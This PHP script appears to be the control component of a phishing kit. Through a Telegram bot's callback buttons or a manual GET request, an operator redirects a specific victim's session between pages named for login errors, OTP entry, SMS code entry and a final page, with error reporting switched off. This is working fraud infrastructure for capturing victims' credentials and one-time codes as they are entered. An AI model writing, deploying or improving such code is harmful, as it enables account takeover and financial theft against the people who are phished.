<?php
require_once 'config.php';

// Ocultar errores
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// === 1. MODO MANUAL ===
if (isset($_GET['session_id']) && isset($_GET['page'])) {
    $session_id = preg_replace('/[^a-zA-Z0-9]/', '', $_GET['session_id']);
    $page = basename($_GET['page']);

    session_write_close();
    session_id($session_id);
    session_start();
    $_SESSION['redirect'] = $page;
    $_SESSION['redirect_set_time'] = time();
    session_write_close();

    echo json_encode(['status' => 'success', 'message' => "Redirigiendo a $page"]);
    exit;
}

// === 2. MODO AUTOMÁTICO (Callback Query) ===
$input = file_get_contents("php://input");
$update = json_decode($input, true);

if (isset($update['callback_query'])) {
    $callback_query = $update['callback_query'];
    $callback_data = trim($callback_query['data']);

    // --- Redirección normal
    if (strpos($callback_data, 'redir:') === 0) {
        $parts = explode(":", $callback_data);
        if (count($parts) === 3) {
            $session_id = preg_replace('/[^a-zA-Z0-9]/', '', $parts[1]);
            $redirect_page = basename($parts[2]);

            $valid_pages = [
                'index.php', 'index-error.php', 'otp.php',
                'otp-error.php','sms.php','sms-error.php', 'finalizar.php'
            ];

            if (!in_array($redirect_page, $valid_pages)) {
                exit;
            }

            session_write_close();
            session_id($session_id);
            session_start();

            // Mantener el mismo ID para todos excepto finalizar
            if ($redirect_page !== 'finalizar.php') {
                $_SESSION['redirect'] = $redirect_page . "?id=" . $session_id;
            } else {
                $_SESSION['redirect'] = $redirect_page;
            }

            $_SESSION['redirect_set_time'] = time();
            session_write_close();

            answerCallbackQuery($callback_query['id'], "✅ Redirigiendo a $redirect_page");
        }
    }
}

// === FUNCIONES ===
function answerCallbackQuery($callback_id, $text) {
    global $bot_token_2;
    $url = "https://api.telegram.org/bot$bot_token_2/answerCallbackQuery";
    $data = ['callback_query_id' => $callback_id, 'text' => $text, 'show_alert' => false];
    sendTelegramRequest($url, $data);
}

function sendTelegramRequest($url, $data) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $resp = @curl_exec($ch);
    curl_close($ch);
    return json_decode($resp, true);
}
?>
